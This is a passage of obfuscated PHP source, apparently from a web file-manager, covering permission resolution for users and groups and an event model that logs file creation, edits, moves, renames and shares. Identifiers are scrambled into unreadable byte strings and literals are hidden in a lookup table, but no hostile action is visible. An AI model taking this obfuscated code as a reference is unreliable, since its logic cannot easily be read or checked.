$ü·î§Ã‚[$È£Û€Š¶] = $»‰Õåæ[$€üôîê[86]][$€üôîê[402]]; $àİú¿Ïï[$È£Û€Š¶] = $£ÔÛ½Œ->parentLevelArray($»‰Õåæ[$€üôîê[521]]); } foreach ($½”…Âã´ as $ÑÄŒ˜·× => $”Æ‹ÎĞ) { $‚¯ı¨®Ê = $ò‘ÇÀá¡[$ÑÄŒ˜·×]; if (!$‚¯ı¨®Ê || !$ü·î§Ã‚[$‚¯ı¨®Ê]) { continue; } $Üàêš“ª = array(); foreach ($àİú¿Ïï[$‚¯ı¨®Ê] as $È£Û€Š¶) { $Üàêš“ª[] = $ü·î§Ã‚[$È£Û€Š¶]; } $½”…Âã´[$ÑÄŒ˜·×] = array_merge($Üàêš“ª, $”Æ‹ÎĞ); } $¤ëãìßÁ = array_values(array_unique($¤ëãìßÁ)); $¸¿¡ÔÌû = array($€üôîê[2037] => $¤ëãìßÁ, $€üôîê[2038] => $½”…Âã´); $³£ÒÊÚë[$ˆ™öõ¤¯] = $¸¿¡ÔÌû; return $¸¿¡ÔÌû; } private function makeSourceAuth($«üİ¦è¿, $È›ä‚Ïš, $¯×‹ Ğˆ = false) { $çïú±·ú =& $_SERVER[­õöî’–]; $¤¼‰Ó€È = $çïú±·ú[88]; $Ç¡šİ… = $«üİ¦è¿[$çïú±·ú[505]]; $¨¢ø¾áş = $«üİ¦è¿[$çïú±·ú[411]] == SourceModel::TYPE_GROUP; $»±Êå” = $¨¢ø¾áş ? $this->groupRootAuth($Ç¡šİ…, $¯×‹ Ğˆ) : !1; if ($»±Êå” && Model($çïú±·ú[507])->authCheckAction($»±Êå”[$çïú±·ú[413]], $çïú±·ú[1870])) { return $this->groupAuthInfo($»±Êå”, $Ç¡šİ…); } $ÌÎÈ–’œ = Model($çïú±·ú[1334])->parentLevelArray($«üİ¦è¿[$çïú±·ú[521]]); $ÌÎÈ–’œ = array_merge(array($«üİ¦è¿[$çïú±·ú[402]]), array_reverse($ÌÎÈ–’œ)); $€ ‹Â°Ã = !1; foreach ($ÌÎÈ–’œ as $ş‰»–»Ã) { if (!isset($È›ä‚Ïš[$ş‰»–»Ã])) { continue; } $ÕƒÍÃÏ¤ = $this->authMake($È›ä‚Ïš[$ş‰»–»Ã], $¯×‹ Ğˆ); if ($ÕƒÍÃÏ¤[$çïú±·ú[467]]) { $€ ‹Â°Ã = $ÕƒÍÃÏ¤; break; } } if (!$¨¢ø¾áş) { return $€ ‹Â°Ã; } if (!$€ ‹Â°Ã && $»±Êå”) { $€ ‹Â°Ã = $this->groupAuthInfo($»±Êå”, $Ç¡šİ…); } if (!$€ ‹Â°Ã) { $àÔÍšıĞ = Model($çïú±·ú[522])->getInfo($Ç¡šİ…); $·…ß¢¦Š = explode($çïú±·ú[50], trim($àÔÍšıĞ[$çïú±·ú[521]], $çïú±·ú[50])); $·…ß¢¦Š = array_reverse($·…ß¢¦Š); foreach ($·…ß¢¦Š as $ø®Şş±×) { if ($ø®Şş±× == $çïú±·ú[197] || $ø®Şş±× == $¤¼‰Ó€È) { continue; } $æƒĞ…éÕ = $this->groupRootAuth($ø®Şş±×, $¯×‹ Ğˆ); if (!$æƒĞ…éÕ) { continue; } $€ ‹Â°Ã = $this->groupAuthInfo($æƒĞ…éÕ, $ø®Şş±×); break; } } if (!$€ ‹Â°Ã || $€ ‹Â°Ã[$çïú±·ú[414]] <= 0) { $ƒÈÎ™° = $this->authDeepCheck($«üİ¦è¿[$çïú±·ú[402]], $¯×‹ Ğˆ); if ($ƒÈÎ™°) { $€ ‹Â°Ã = $ƒÈÎ™°; } } return $€ ‹Â°Ã; } private function userIsRoot($Ïğ’™¦• = false) { $×´«äŞÆ =& $_SERVER[­õöî’–]; if (!$Ïğ’™¦• && _get($GLOBALS, $×´«äŞÆ[503])) { return !0; } $…Ğäœ¡ª = Model($×´«äŞÆ[535])->getInfo($Ïğ’™¦•); $ğ¤•â¦º = Model($×´«äŞÆ[2046])->listData($…Ğäœ¡ª[$×´«äŞÆ[1541]]); if ($ğ¤•â¦º && $ğ¤•â¦º[$×´«äŞÆ[511]][$×´«äŞÆ[2047]] == 1) { return !0; } return !1; } private function sourceAuthInfo($â„® òš) { $à”¶Æ›² =& $_SERVER[­õöî’–]; $Ùõ¤îİı = Model($à”¶Æ›²[1334]); $æÙşüÉ = $Ùõ¤îİı->sourceInfo($â„® òš); if (!$æÙşüÉ) { return !1; } $Ùõ¤îİı->groupPathDisplay($æÙşüÉ); $’ÑšÆ× = array($æÙşüÉ); $’ÑšÆ× = $Ùõ¤îİı->_listAppendPath($’ÑšÆ×); $æÙşüÉ = $’ÑšÆ×[0]; $×„°¹”Ê = $æÙşüÉ[$à”¶Æ›²[519]]; if (isset($æÙşüÉ[$à”¶Æ›²[527]])) { $«±îÑ Æ = explode($à”¶Æ›²[8], trim($æÙşüÉ[$à”¶Æ›²[519]], $à”¶Æ›²[8])); array_shift($«±îÑ Æ); $×„°¹”Ê = $æÙşüÉ[$à”¶Æ›²[525]] . $à”¶Æ›²[2048] . implode($à”¶Æ›²[8], $«±îÑ Æ); } return array($à”¶Æ›²[420] => $æÙşüÉ[$à”¶Æ›²[32]], $à”¶Æ›²[84] => KodIO::make($æÙşüÉ[$à”¶Æ›²[402]]), $à”¶Æ›²[2049] => $×„°¹”Ê); } private function groupAuthInfo($ªïÅ†…ê, $ˆõ¤Ãˆû) { $Ã¼Ä¥öÑ =& $_SERVER[­õöî’–]; $ÄúœÖ‰› = Model($Ã¼Ä¥öÑ[522])->getInfo($ˆõ¤Ãˆû); return array($Ã¼Ä¥öÑ[2050] => intval($ªïÅ†…ê[$Ã¼Ä¥öÑ[413]]), $Ã¼Ä¥öÑ[2034] => $ªïÅ†…ê, $Ã¼Ä¥öÑ[2051] => LNG($Ã¼Ä¥öÑ[2052]), $Ã¼Ä¥öÑ[2043] => array($Ã¼Ä¥öÑ[420] => $ÄúœÖ‰›[$Ã¼Ä¥öÑ[32]], $Ã¼Ä¥öÑ[84] => KodIO::make($ÄúœÖ‰›[$Ã¼Ä¥öÑ[86]][$Ã¼Ä¥öÑ[402]]), $Ã¼Ä¥öÑ[2049] => $ÄúœÖ‰›[$Ã¼Ä¥öÑ[526]])); } protected function groupRootAuth($©Å‡ŠŸ°, $ç–¡§§ê = false) { $‰Œ“Øµ =& $_SERVER[­õöî’–]; $ç–¡§§ê = $ç–¡§§ê ? $ç–¡§§ê : USER_ID; $¿¦êÉ•ù = $ç–¡§§ê . $‰Œ“Øµ[2053] . $©Å‡ŠŸ°; static $·ñôªò¿ = array(); if (isset($·ñôªò¿[$¿¦êÉ•ù])) { return $·ñôªò¿[$¿¦êÉ•ù]; } $ƒÑôƒí® = Model($‰Œ“Øµ[522])->getInfo($©Å‡ŠŸ°); $ê»Ú”Ìä = $this->userGroupList($ç–¡§§ê); $®ÆÄ“† = isset($ê»Ú”Ìä[$©Å‡ŠŸ°]) ? $ê»Ú”Ìä[$©Å‡ŠŸ°][$‰Œ“Øµ[413]] : !1; if ($®ÆÄ“† && Model($‰Œ“Øµ[507])->authCheckAction($®ÆÄ“†[$‰Œ“Øµ[413]], $‰Œ“Øµ[1870])) { $·ñôªò¿[$¿¦êÉ•ù] = $®ÆÄ“†; return $®ÆÄ“†; } $×˜†Î¯ = $this->sourceAuthSelect($ƒÑôƒí®[$‰Œ“Øµ[86]][$‰Œ“Øµ[402]]); $­ìí°¿„ = $×˜†Î¯ ? $this->authMake($×˜†Î¯, $ç–¡§§ê) : !1; $ª®É‹¡ = $­ìí°¿„ ? $­ìí°¿„[$‰Œ“Øµ[467]] : !1; $·ñôªò¿[$¿¦êÉ•ù] = $ª®É‹¡ ? $ª®É‹¡ : $®ÆÄ“†; return $·ñôªò¿[$¿¦êÉ•ù]; } public function authOwnerApply($ÙıË ùı) { $Ñİ¼Ü™ˆ =& $_SERVER[­õöî’–]; if (empty($ÙıË ùı[$Ñİ¼Ü™ˆ[413]]) || isset($ÙıË ùı[$Ñİ¼Ü™ˆ[2054]]) && $ÙıË ùı[$Ñİ¼Ü™ˆ[2054]]) { return $ÙıË ùı; } if (AuthModel::authCheckRoot($ÙıË ùı[$Ñİ¼Ü™ˆ[413]][$Ñİ¼Ü™ˆ[414]])) { return $ÙıË ùı; } $áíå×šÚ = Model($Ñİ¼Ü™ˆ[1334])->parentLevelArray($ÙıË ùı[$Ñİ¼Ü™ˆ[521]]); $áíå×šÚ = array_merge(array($ÙıË ùı[$Ñİ¼Ü™ˆ[402]]), array_reverse($áíå×šÚ)); $‹ÁúÚƒ = $this->sourceAuthSelect($áíå×šÚ); $«ÎŒŒ“… = array(); $Ş¢Ã = array(); foreach ($‹ÁúÚƒ as $ëöĞí¦‡ => $±ëŒéƒ„) { $‰¢¿†…„ = $this->authFolderOwnerUser($±ëŒéƒ„); $«ÎŒŒ“…[$ëöĞí¦‡] = $‰¢¿†…„; $Ş¢Ã = array_merge($Ş¢Ã, $‰¢¿†…„[$Ñİ¼Ü™ˆ[600]]); if ($‰¢¿†…„[$Ñİ¼Ü™ˆ[2055]]) { break; } } if (count($Ş¢Ã) == 0) { $Ş¢Ã = $this->authFolderOwnerGroup($ÙıË ùı[$Ñİ¼Ü™ˆ[505]]); } $Ş¢Ã = array_unique($Ş¢Ã); if (AuthModel::authCheckRoot($ÙıË ùı[$Ñİ¼Ü™ˆ[413]][$Ñİ¼Ü™ˆ[414]])) { $Ş¢Ã[] = USER_ID; } $ÙıË ùı[$Ñİ¼Ü™ˆ[413]][$Ñİ¼Ü™ˆ[2056]] = Model($Ñİ¼Ü™ˆ[513])->userListInfo($Ş¢Ã); return $ÙıË ùı; } private function authFolderOwnerGroup($¨ŠâËÑ) { $ÏÚ­ë‘— =& $_SERVER[­õöî’–]; $ƒĞ£ıª„ = Model($ÏÚ­ë‘—[1939])->where(array($ÏÚ­ë‘—[1849] => $¨ŠâËÑ))->select(); $Û¥ŸôŸ = array(); if (!$ƒĞ£ıª„) { return $Û¥ŸôŸ; } foreach ($ƒĞ£ıª„ as $áıı‰ĞÁ) { $÷ØÎÜĞƒ = $this->authInfo($áıı‰ĞÁ); if (AuthModel::authCheckRoot($÷ØÎÜĞƒ[$ÏÚ­ë‘—[413]])) { $Û¥ŸôŸ[] = $áıı‰ĞÁ[$ÏÚ­ë‘—[1660]]; } } return $Û¥ŸôŸ; } private function authFolderOwnerUser($´úİ‹Ã) { $éß‡íëí =& $_SERVER[­õöî’–]; $ÇÁ‹Ñ¨ª = array(); $”Ä˜“øª = !1; foreach ($´úİ‹Ã as $öãÍë¸å) { $ƒ³°º×ë = $this->authInfo($öãÍë¸å); if ($öãÍë¸å[$éß‡íëí[505]] == $éß‡íëí[197]) { $”Ä˜“øª = !0; } if ($öãÍë¸å[$éß‡íëí[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ƒ³°º×ë[$éß‡íëí[413]])) { $ÇÁ‹Ñ¨ª[] = $öãÍë¸å[$éß‡íëí[505]]; } } } return array($éß‡íëí[600] => $ÇÁ‹Ñ¨ª, $éß‡íëí[2055] => $”Ä˜“øª); } public function authMake($œà›Šô, $ü£û†ç = false) { $£‡ßÈÜò =& $_SERVER[­õöî’–]; $´ÜüÊ‘ = $this->authArrayCheck($œà›Šô, $ü£û†ç); if ($´ÜüÊ‘[$£‡ßÈÜò[2057]]) { $´ÜüÊ‘[$£‡ßÈÜò[2057]] = $this->sourceAuthInfo($´ÜüÊ‘[$£‡ßÈÜò[2057]]); } return $´ÜüÊ‘; } public function authArrayCheck($Œ¡‚¨äº, $Š™ÓÅÑÒ = false) { $ ‹ôà²­ =& $_SERVER[­õöî’–]; if (!$Œ¡‚¨äº) { return array($ ‹ôà²­[414] => 0, $ ‹ôà²­[467] => !1); } $Š™ÓÅÑÒ = $Š™ÓÅÑÒ ? $Š™ÓÅÑÒ : USER_ID; $åù¸ùê = 0; $â·Ø³Ÿ = 0; $ôÉ’Ôİ = 0; $…éº¶£¶ = 0; $ùü‡â€‚ = 0; $„ „Æ§ã = 0; $ò ¼²ŞÒ = 1000; $¡ÒÌ‘ã× = 0; $„´ç¦êÌ = 0; $¸§Úâ£ = 0; $’Øë’º” = 0; $úòã³Î» = array($ ‹ôà²­[402] => 0); foreach ($Œ¡‚¨äº as $úòã³Î») { $ÔÏÃÒïÍ = $this->authInfo($úòã³Î»); if (!$ÔÏÃÒïÍ) { continue; } $ë½ıİìÍ = $úòã³Î»[$ ‹ôà²­[505]]; $³»Â¬˜ = intval($ÔÏÃÒïÍ[$ ‹ôà²­[413]]); if ($úòã³Î»[$ ‹ôà²­[411]] == SourceModel::TYPE_USER && $ë½ıİìÍ == $Š™ÓÅÑÒ) { $åù¸ùê = !0; $ôÉ’Ôİ = $ÔÏÃÒïÍ; $â·Ø³Ÿ = $³»Â¬˜; } else { if ($úòã³Î»[$ ‹ôà²­[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ë½ıİìÍ, $Š™ÓÅÑÒ)) { $…éº¶£¶ = !0; $£¼İ¨é = $this->groupStepToUserGroup($ë½ıİìÍ, $Š™ÓÅÑÒ); if ($£¼İ¨é < $ò ¼²ŞÒ) { $ò ¼²ŞÒ = $£¼İ¨é; $ùü‡â€‚ = $³»Â¬˜; $„ „Æ§ã = $ÔÏÃÒïÍ; $¡ÒÌ‘ã× = $ë½ıİìÍ; } if ($£¼İ¨é == $ò ¼²ŞÒ && $³»Â¬˜ >= $ùü‡â€‚) { $ùü‡â€‚ = $³»Â¬˜; $„ „Æ§ã = $ÔÏÃÒïÍ; $¡ÒÌ‘ã× = $ë½ıİìÍ; } } else { if ($ë½ıİìÍ == $ ‹ôà²­[197]) { $„´ç¦êÌ = !0; $’Øë’º” = $ÔÏÃÒïÍ; $¸§Úâ£ = $³»Â¬˜; } } } } if ($åù¸ùê) { $œ—¥–¶ = $â·Ø³Ÿ; $ÔÏÃÒïÍ = $ôÉ’Ôİ; $øÅÌøä = LNG($ ‹ôà²­[2058]); } else { if ($…éº¶£¶) { $œ—¥–¶ = $ùü‡â€‚; $ÔÏÃÒïÍ = $„ „Æ§ã; $â†À´ğ‰ = Model($ ‹ôà²­[522])->getInfo($¡ÒÌ‘ã×); $øÅÌøä = $ ‹ôà²­[162] . $â†À´ğ‰[$ ‹ôà²­[526]] . $ ‹ôà²­[2059] . LNG($ ‹ôà²­[2060]); } else { if ($„´ç¦êÌ) { $œ—¥–¶ = $¸§Úâ£; $ÔÏÃÒïÍ = $’Øë’º”; $øÅÌøä = LNG($ ‹ôà²­[2031]); } else { $œ—¥–¶ = 0; $ÔÏÃÒïÍ = !1; $øÅÌøä = $ ‹ôà²­[12]; } } } $ç¼ÁšÓŒ = array($ ‹ôà²­[2050] => intval($œ—¥–¶), $ ‹ôà²­[2034] => $ÔÏÃÒïÍ, $ ‹ôà²­[2051] => $øÅÌøä, $ ‹ôà²­[2043] => $úòã³Î»[$ ‹ôà²­[402]]); return $ç¼ÁšÓŒ; } private function groupContainUser($¡÷ƒû­Û, $Ó±Æ¡Û¸ = false) { return in_array($¡÷ƒû­Û, $this->userGroupParents($Ó±Æ¡Û¸)); } private function groupStepToUserGroup($ğµé×À, $Ü•ÑÌúş = false) { $™ò³÷šÓ =& $_SERVER[­õöî’–]; $÷ÀŸ¿Ò = $this->userGroupList($Ü•ÑÌúş); $Öâ¬«Âõ = 1000; $É‹Ì½î¨ = $GLOBALS[$™ò³÷šÓ[6]][$™ò³÷šÓ[89]][$™ò³÷šÓ[1952]] == 1; $ßĞèïÆÌ = $É‹Ì½î¨ ? 3 : 2; foreach ($÷ÀŸ¿Ò as $Í£ş’À²) { if ($Í£ş’À²[$™ò³÷šÓ[1849]] == $ğµé×À) { return 0; } $±³‹¯ğï = explode($™ò³÷šÓ[50], trim($Í£ş’À²[$™ò³÷šÓ[521]], $™ò³÷šÓ[50])); if ($±³‹¯ğï[0] == $™ò³÷šÓ[197] && count($±³‹¯ğï) > $ßĞèïÆÌ) { $†œ›‹ğµ = array_reverse(array_slice($±³‹¯ğï, $ßĞèïÆÌ)); $¼âã“ëà = array_search($ğµé×À, $†œ›‹ğµ); if ($¼âã“ëà !== !1 && $¼âã“ëà + 1 <= $Öâ¬«Âõ) { $Öâ¬«Âõ = $¼âã“ëà + 1; } } } return $Öâ¬«Âõ; } private function userGroupList($¢¹‰ù± = false) { $ƒ™¬ğü‚ =& $_SERVER[­õöî’–]; static $ù×Ó‡ú = array(); if (isset($ù×Ó‡ú[$¢¹‰ù±])) { return $ù×Ó‡ú[$¢¹‰ù±]; } $çÅ¸°¾° = Model($ƒ™¬ğü‚[535])->getInfo($¢¹‰ù±); $ù×Ó‡ú[$¢¹‰ù±] = array_to_keyvalue($çÅ¸°¾°[$ƒ™¬ğü‚[2032]], $ƒ™¬ğü‚[1849]); return $ù×Ó‡ú[$¢¹‰ù±]; } public function userGroupParents($‘ ¢öÚ¨) { $¸œµ‘ï =& $_SERVER[­õöî’–]; static $ìùšÏÍ = array(); $‘ ¢öÚ¨ = $‘ ¢öÚ¨ ? $‘ ¢öÚ¨ : USER_ID; if (isset($ìùšÏÍ[$‘ ¢öÚ¨])) { return $ìùšÏÍ[$‘ ¢öÚ¨]; } $–¾‹ï§ = $this->userGroupList($‘ ¢öÚ¨); $Ä¥ä˜† = array(); $•ÑĞóı¡ = $GLOBALS[$¸œµ‘ï[6]][$¸œµ‘ï[89]][$¸œµ‘ï[1952]] == 1; $úĞ‘¯ò = $•ÑĞóı¡ ? 3 : 2; foreach ($–¾‹ï§ as $ªÔüæãå) { $¤„êÊ­ï = array($ªÔüæãå[$¸œµ‘ï[1849]]); $¿¤Ú¨èæ = explode($¸œµ‘ï[50], trim($ªÔüæãå[$¸œµ‘ï[521]], $¸œµ‘ï[50])); if ($¿¤Ú¨èæ[0] == $¸œµ‘ï[197] && count($¿¤Ú¨èæ) > $úĞ‘¯ò) { $“•‘ˆÇŠ = array_slice($¿¤Ú¨èæ, $úĞ‘¯ò); $¤„êÊ­ï = array_merge($¤„êÊ­ï, array_reverse($“•‘ˆÇŠ)); } $Ä¥ä˜† = array_merge($Ä¥ä˜†, $¤„êÊ­ï); } $ìùšÏÍ[$‘ ¢öÚ¨] = array_unique($Ä¥ä˜†); return $ìùšÏÍ[$‘ ¢öÚ¨]; } public function authTargetInfoMake($Œ³¥‰îƒ) { $é®Ğ²è£ =& $_SERVER[­õöî’–]; $üêºçŠŒ = array(); $çŞ¹º¬ = array(); foreach ($Œ³¥‰îƒ as $¹ä¿ôÛ) { if ($¹ä¿ôÛ[$é®Ğ²è£[411]] == SourceModel::TYPE_USER) { $üêºçŠŒ[] = intval($¹ä¿ôÛ[$é®Ğ²è£[505]]); } else { if ($¹ä¿ôÛ[$é®Ğ²è£[411]] == SourceModel::TYPE_GROUP) { $çŞ¹º¬[] = intval($¹ä¿ôÛ[$é®Ğ²è£[505]]); } } } if ($üêºçŠŒ) { $üêºçŠŒ = Model($é®Ğ²è£[513])->userListInfo($üêºçŠŒ); } if ($çŞ¹º¬) { $¹„¿†º‘ = array($é®Ğ²è£[1937] => array($é®Ğ²è£[418], $çŞ¹º¬)); $çŞ¹º¬ = Model($é®Ğ²è£[522])->field($é®Ğ²è£[2061])->where($¹„¿†º‘)->select(); $çŞ¹º¬ = array_to_keyvalue($çŞ¹º¬, $é®Ğ²è£[1849]); } return array($é®Ğ²è£[2062] => $üêºçŠŒ, $é®Ğ²è£[2063] => $çŞ¹º¬); } public function authInfo($–’àµì€) { $™ªåüú§ =& $_SERVER[­õöî’–]; if ($–’àµì€[$™ªåüú§[1953]]) { $ÌˆÃÌˆï = Model($™ªåüú§[507])->listData($–’àµì€[$™ªåüú§[1953]]); if (!$ÌˆÃÌˆï) { return !1; $ÍÂ¼ô’ = Model($™ªåüú§[507])->listData(); $¥¹‡©•¨ = array_filter_by_field($ÍÂ¼ô’, $™ªåüú§[413], $™ªåüú§[197]); return $¥¹‡©•¨; } $–õõŒÆ = array_field_key($ÌˆÃÌˆï, array($™ªåüú§[399], $™ªåüú§[32], $™ªåüú§[413], $™ªåüú§[1872], $™ªåüú§[1873])); $–õõŒÆ[$™ªåüú§[2064]] = $–’àµì€; return $–õõŒÆ; } else { return array($™ªåüú§[419] => 0, $™ªåüú§[1855] => $–’àµì€[$™ªåüú§[2009]], $™ªåüú§[420] => $™ªåüú§[12], $™ªåüú§[1872] => $™ªåüú§[2065]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\145\137\145\166\145\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\151\x6d\x65", "\164\151\x6d\145", "\151\156\163\x65\162\x74", "\x66\x75\156\143\164\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\151\156\x73\145\162\164\54\165\160\x64\141\x74\145\x2c\163\x65\154\x65\x63\x74", "\x6a\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($½€Ê¥¯, $—©ÁÖÀ, $¾ãÛ‡£â = '') { $ÇŞ§Ãşí =& $_SERVER[­õöî’–]; if (!$this->eventSave) { return; } $Áüğˆ— = Model($ÇŞ§Ãşí[1334])->sourceInfo($½€Ê¥¯); if (!$Áüğˆ—) { return !1; } if ($this->isCacheEvent($Áüğˆ—, $—©ÁÖÀ)) { return; } if ($¾ãÛ‡£â && is_string($¾ãÛ‡£â)) { $¾ãÛ‡£â = array($ÇŞ§Ãşí[1888] => $¾ãÛ‡£â); } $ÃİÄÊãÜ = array($ÇŞ§Ãşí[417] => $½€Ê¥¯, $ÇŞ§Ãşí[2066] => $Áüğˆ—[$ÇŞ§Ãşí[432]], $ÇŞ§Ãşí[2067] => $Áüğˆ—[$ÇŞ§Ãşí[32]], $ÇŞ§Ãşí[519] => !empty($Áüğˆ—[$ÇŞ§Ãşí[519]]) ? $Áüğˆ—[$ÇŞ§Ãşí[519]] : $ÇŞ§Ãşí[12], $ÇŞ§Ãşí[1651] => USER_ID, $ÇŞ§Ãşí[422] => $—©ÁÖÀ, $ÇŞ§Ãşí[1653] => $¾ãÛ‡£â); $this->addSystemLog($—©ÁÖÀ, $ÃİÄÊãÜ); unset($ÃİÄÊãÜ[$ÇŞ§Ãşí[2067]], $ÃİÄÊãÜ[$ÇŞ§Ãşí[519]]); return $this->add($ÃİÄÊãÜ); } private function addSystemLog($Ì´è‘¤Å, $£õÔ™Ãæ) { $Ö¦šäĞû =& $_SERVER[­õöî’–]; if ($Ì´è‘¤Å == $Ö¦šäĞû[2068]) { $Ì´è‘¤Å = $£õÔ™Ãæ[$Ö¦šäĞû[453]][$Ö¦šäĞû[2069]]; } else { if (in_array($Ì´è‘¤Å, array($Ö¦šäĞû[1829], $Ö¦šäĞû[2070]))) { $Ì´è‘¤Å = $£õÔ™Ãæ[$Ö¦šäĞû[453]][$Ö¦šäĞû[746]]; } } $¬¯ĞÑ˜ = array_merge($£õÔ™Ãæ, array($Ö¦šäĞû[2071] => $£õÔ™Ãæ[$Ö¦šäĞû[402]], $Ö¦šäĞû[2072] => $£õÔ™Ãæ[$Ö¦šäĞû[2072]])); Hook::trigger($Ö¦šäĞû[2073], $Ö¦šäĞû[2074] . $Ì´è‘¤Å, $£õÔ™Ãæ); Model($Ö¦šäĞû[1793])->addLog($Ö¦šäĞû[2074] . $Ì´è‘¤Å, $¬¯ĞÑ˜); } private function isCacheEvent($¤è¼ºÂâ, $Êì¥ëÚ) { if ($¤è¼ºÂâ[$_SERVER[­õöî’–][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($§¢èš¨Ù, $‘åì®§Ú) { $µ¶âïŒí =& $_SERVER[­õöî’–]; $ôõÑ¼Ï¥ = Model($µ¶âïŒí[1334])->sourceInfo($§¢èš¨Ù); $ÍÍÓãø = array($µ¶âïŒí[2069] => $‘åì®§Ú, $µ¶âïŒí[32] => $ôõÑ¼Ï¥[$µ¶âïŒí[32]]); return $this->addEvent($§¢èš¨Ù, $µ¶âïŒí[2068], $ÍÍÓãø); } public function eventFileEdit($ÏöÓüõ) { $úñĞóõÔ =& $_SERVER[­õöî’–]; $Ğº«·éš = array($úñĞóõÔ[2075] => $_SERVER[$úñĞóõÔ[2076]], $úñĞóõÔ[2077] => strtolower(ACTION)); if (isset($GLOBALS[$úñĞóõÔ[7]][$úñĞóõÔ[2078]])) { $Ğº«·éš[$úñĞóõÔ[2078]] = $úñĞóõÔ[88]; } return $this->addEvent($ÏöÓüõ, $úñĞóõÔ[1819], $Ğº«·éš); } public function eventRecycle($Ø‹º½áŞ, $ô‚ëáñ‚) { return $this->addEvent($Ø‹º½áŞ, $_SERVER[­õöî’–][2070], $ô‚ëáñ‚); } public function eventRemove($Ô„¯…ô) { $Ò““°‚× =& $_SERVER[­õöî’–]; $Öü¿úú™ = Model($Ò““°‚×[1334])->sourceInfo($Ô„¯…ô); $ÎœàÒÙ = $Öü¿úú™[$Ò““°‚×[32]]; return $this->addEvent($Öü¿úú™[$Ò““°‚×[432]], $Ò““°‚×[1818], $ÎœàÒÙ); } public function eventShare($º³èış—, $éä¿²è¯) { return $this->addEvent($º³èış—, $_SERVER[­õöî’–][1829], $éä¿²è¯); } public function eventMove($İØÏÆüõ, $­õ÷½å¾, $¸ç) { $»×ĞñĞ× =& $_SERVER[­õöî’–]; $Ü…¶ş½¶ = Model($»×ĞñĞ×[1334]); $ÎƒŒ‡§Š = $Ü…¶ş½¶->sourceInfo($İØÏÆüõ); $Ë™¿®û = $Ü…¶ş½¶->sourceInfo($­õ÷½å¾); $âöëŠ· = $Ü…¶ş½¶->sourceInfo($¸ç); $ĞÏÌ·ı = array($»×ĞñĞ×[1158] => $­õ÷½å¾, $»×ĞñĞ×[2079] => $Ë™¿®û[$»×ĞñĞ×[32]], $»×ĞñĞ×[2057] => !empty($Ë™¿®û[$»×ĞñĞ×[519]]) ? $Ë™¿®û[$»×ĞñĞ×[519]] : $»×ĞñĞ×[12], $»×ĞñĞ×[1159] => $¸ç, $»×ĞñĞ×[2080] => $âöëŠ·[$»×ĞñĞ×[32]], $»×ĞñĞ×[2081] => !empty($âöëŠ·[$»×ĞñĞ×[519]]) ? $âöëŠ·[$»×ĞñĞ×[519]] : $»×ĞñĞ×[12]); $this->addEvent($İØÏÆüõ, $»×ĞñĞ×[557], $ĞÏÌ·ı); $ÎƒŒ‡§Š = $Ü…¶ş½¶->sourceInfo($İØÏÆüõ); $ĞÏÌ·ı = array($»×ĞñĞ×[402] => $ÎƒŒ‡§Š[$»×ĞñĞ×[402]], $»×ĞñĞ×[32] => $ÎƒŒ‡§Š[$»×ĞñĞ×[32]]); $this->addEvent($­õ÷½å¾, $»×ĞñĞ×[2082], $ĞÏÌ·ı); } public function eventCopy($…ÙüÛÆ¥) { $this->eventCreate($…ÙüÛÆ¥, $_SERVER[­õöî’–][555]); } public function eventRename($ñºå¯êÊ, $Ñƒ·‘ĞË, $›˜¬€¾½) { $¹åÄÑ»û =& $_SERVER[­õöî’–]; $›ƒê¯¨Ú = array($¹åÄÑ»û[1158] => $Ñƒ·‘ĞË, $¹åÄÑ»û[1159] => $›˜¬€¾½); return $this->addEvent($ñºå¯êÊ, $¹åÄÑ»û[1349], $›ƒê¯¨Ú); } public function eventAddComment($ÙĞı®Œ , $öªÒëâ¦) { return $this->addEvent($ÙĞı®Œ , $_SERVER[­õöî’–][2083], $öªÒëâ¦); } public function eventAddDesc($‚¥îè—, $²ò• ®²) { return $this->addEvent($‚¥îè—, $_SERVER[­õöî’–][2084], $²ò• ®²); } public function listBySource($Î¡­×œÏ) { $Å¬ªÕô =& $_SERVER[­õöî’–]; $ä˜£”±ş = Model($Å¬ªÕô[1334])->sourceInfo($Î¡­×œÏ); $ºš¾ûŒù = array($Å¬ªÕô[417] => $Î¡­×œÏ); if ($ä˜£”±ş[$Å¬ªÕô[410]] == $Å¬ªÕô[88]) { $ÑˆŠ­¥¯ = Model($Å¬ªÕô[1334])->listSearchChildren($Î¡­×œÏ, 20000); $ÑˆŠ­¥¯[] = $Î¡­×œÏ . $Å¬ªÕô[378]; $ºš¾ûŒù = array($Å¬ªÕô[402] => array($Å¬ªÕô[7], $ÑˆŠ­¥¯)); } $•§€„§Ö = $this->where($ºš¾ûŒù)->order($Å¬ªÕô[2085])->selectPage(); if ($•§€„§Ö[$Å¬ªÕô[366]][$Å¬ªÕô[367]] == 0) { $•§€„§Ö[$Å¬ªÕô[366]][$Å¬ªÕô[367]] = 1; $•§€„§Ö[$Å¬ªÕô[369]] = array(array($Å¬ªÕô[417] => $Î¡­×œÏ, $Å¬ªÕô[2066] => $ä˜£”±ş[$Å¬ªÕô[432]], $Å¬ªÕô[1651] => $ä˜£”±ş[$Å¬ªÕô[454]], $Å¬ªÕô[422] => $Å¬ªÕô[2086], $Å¬ªÕô[423] => $ä˜£”±ş[$Å¬ªÕô[200]], $Å¬ªÕô[1653] => $Å¬ªÕô[12])); } return $this->eventListParse($•§€„§Ö, $Î¡­×œÏ); } private function eventListParse($îÈÚü¦ò, $¥ïÎÊÁö) { $ÂºìÙèÏ =& $_SERVER[­õöî’–]; $ ÉëÙ¿Ç = $îÈÚü¦ò[$ÂºìÙèÏ[369]]; $›É¯ÃÙŞ = array_to_keyvalue($ ÉëÙ¿Ç, $ÂºìÙèÏ[12], $ÂºìÙèÏ[402]); $àŞ®¡ßà = array_to_keyvalue($ ÉëÙ¿Ç, $ÂºìÙèÏ[12], $ÂºìÙèÏ[2072]); foreach ($ ÉëÙ¿Ç as $ï„Ì†Ìñ) { $è¤õàÇ  = $ï„Ì†Ìñ[$ÂºìÙèÏ[453]]; if ($ï„Ì†Ìñ[$ÂºìÙèÏ[33]] == 